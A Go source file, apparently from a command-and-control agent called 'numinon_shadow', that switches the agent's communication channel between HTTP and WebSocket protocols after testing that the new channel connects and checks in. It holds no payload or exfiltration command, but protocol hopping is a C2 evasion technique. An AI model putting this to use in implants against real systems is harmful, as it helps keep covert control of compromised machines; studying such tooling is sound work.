package agent

import (
	"errors"
	"log"
	"numinon_shadow/internal/agent/comm"
	"numinon_shadow/internal/agent/config"
)

// attemptHopSequence tries to perform a protocol hop.
// It's called by a runLoop when hop flag is set.
//
// Parameters:
//   - localConfigForHop: The new agent configuration for this hop attempt (a copy).
//   - currentLoopTypeIsHttp: true if called from runHttpLoop, false if from runWsLoop.
//
// Returns:
//   - hopSuccessfullyExecuted (bool): true if agent's communicator and config were successfully changed.
//   - protocolFamilyDidChange (bool): true if new protocol family differs, for ex went from WS(S) <-> HTTP(S)
//   - criticalError (error): non-nil if an unrecoverable error occurred *after committing* to the hop.
func (a *Agent) attemptHopSequence(localConfigForHop config.AgentConfig, currentLoopTypeIsHttp bool) (hopSuccessfullyExecuted bool, protocolFamilyDidChange bool, criticalError error) {
	// Prep some command + protocol specific logging info
	logPfx := "|🐇 ATTEMPT HOP|"
	currentCommTypeForLog := "UNKNOWN"
	if a.communicator != nil {
		currentCommTypeForLog = string(a.communicator.Type())
	}

	log.Printf("%s Called. Current comm: %s. Target new protocol: %s.", logPfx, currentCommTypeForLog, localConfigForHop.Protocol)

	// Create Prospective New Communicator (for new intended protocol)
	log.Printf("%s Creating prospective communicator for %s...", logPfx, localConfigForHop.Protocol)

	// REMINDER: WE already have agent struct
	// No need to create new one
	// There is a field in Agent called Communicator
	// So essentially, we want to replace that field with a new Communicator
	prospectiveNewComm, newCommErr := comm.NewCommunicator(localConfigForHop)
	if newCommErr != nil {
		log.Printf("|❗ERR %s| Failed to create prospective communicator for %s: %v. Aborting hop.",
			logPfx, localConfigForHop.Protocol, newCommErr)
		return false, false, nil
	}

	log.Printf("%s Prospective communicator %s created.", logPfx, prospectiveNewComm.Type())

	// Test New Channel Viability
	// We first check to ensure we can connect before making the hop
	var testChannelErr error
	log.Printf("%s Attempting Connect() with prospective %s...", logPfx, prospectiveNewComm.Type())
	connectErr := prospectiveNewComm.Connect()

	if connectErr != nil {
		testChannelErr = connectErr
	} else {
		log.Printf("%s Prospective %s Connect() successful. Proceeding with viability test.", logPfx, prospectiveNewComm.Type())
		isNewProtoHttp := isHttpProtocol(localConfigForHop.Protocol)

		// --- MODIFIED LOGIC ---
		if isNewProtoHttp {
			// For HTTP, an active CheckIn is the correct viability test.
			log.Printf("%s Performing active CheckIn test for new HTTP channel...", logPfx)
			_, httpTestErr := prospectiveNewComm.CheckIn()
			if httpTestErr != nil {
				testChannelErr = httpTestErr
			}
		}
		// For WebSocket, a successful Connect() is sufficient.

	}

	// Evaluate Test and Commit or Abort Hop
	if testChannelErr != nil {
		log.Printf("|❗ERR %s| New channel %s NOT viable (Error during connect/test: %v). Aborting hop.",
			logPfx, prospectiveNewComm.Type(), testChannelErr)
		if discErr := prospectiveNewComm.Disconnect(); discErr != nil {
			log.Printf("|WARN %s| Error disconnecting failed prospective communicator %s: %v", logPfx, prospectiveNewComm.Type(), discErr)
		}
		return false, false, nil // Hop aborted
	}

	log.Printf("%s New channel %s confirmed viable. Proceeding with switch.", logPfx, prospectiveNewComm.Type())
	oldCommunicator := a.communicator
	if oldCommunicator != nil {
		log.Printf("%s Disconnecting old communicator (%s)...", logPfx, oldCommunicator.Type())
		oldCommunicator.Disconnect()
	}

	a.config = localConfigForHop
	a.communicator = prospectiveNewComm

	log.Printf("%s Agent config updated. Switched to new communicator: %s.", logPfx, a.communicator.Type())

	newLoopTypeIsHttp := isHttpProtocol(a.config.Protocol)
	familyDidChange := newLoopTypeIsHttp != currentLoopTypeIsHttp

	if familyDidChange {
		log.Printf("%s Protocol family changed. Signaling run loop restart.", logPfx)
	} else {
		log.Printf("%s Protocol family remains the same. Hop successful.", logPfx)
	}
	return true, familyDidChange, nil // Hop executed successfully
}

// isHttpProtocol checks if the given protocol is HTTP-based.
func isHttpProtocol(p config.AgentProtocol) bool {
	switch p {
	case config.HTTP1Clear, config.HTTP1TLS, config.HTTP2TLS, config.HTTP3:
		return true
	default:
		return false
	}
}

// ErrHopProtocolTypeChange is a sentinel error used by run loops to indicate
// that a hop occurred requiring a change in the type of run loop (e.g., HTTP to WS).
var ErrHopProtocolTypeChange = errors.New("hop: protocol type change requires loop restart")
